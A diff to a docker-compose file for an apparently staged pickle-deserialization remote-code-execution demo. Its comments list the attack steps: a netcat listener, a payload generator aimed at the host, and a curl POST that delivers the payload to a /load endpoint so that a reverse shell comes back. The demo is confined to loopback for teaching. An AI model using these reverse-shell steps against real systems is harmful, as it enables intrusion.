@@ -1,14 +1,17 @@
 # Pickle deserialization RCE demo.
-# On stage:
-#   1) host terminal:  nc -lvnp 4444
+# NOTE: for the keynote, prefer the integrated lab in ../../stage (persistent, named,
+# visible in Docker Desktop). This standalone compose is for quick local runs.
+# On stage (standalone):
+#   1) listener:       ncat -lvk 4444   (macOS BSD `nc` has NO -lvnp; use ncat, or `nc -l 4444`)
 #   2) build/run:      docker compose up --build -d
 #   3) make payload:   LISTENER_HOST=host.docker.internal python3 make_payload.py
-#   4) send it:        curl -s -X POST http://localhost:5000/load -d "data=<base64>"
-#   5) shell lands in terminal 1.
+#   4) send it:        curl -s -X POST http://localhost:5001/load --data-urlencode "data=<base64>"
+#   5) shell lands at the listener.
+# Host port 5000 is taken by macOS AirPlay/Control Center, so publish on 5001.
 services:
   app:
     build: .
     ports:
-      - "5000:5000"
+      - "127.0.0.1:5001:5000"   # loopback only — don't expose an unauth RCE endpoint on the LAN
     extra_hosts:
       - "host.docker.internal:host-gateway"
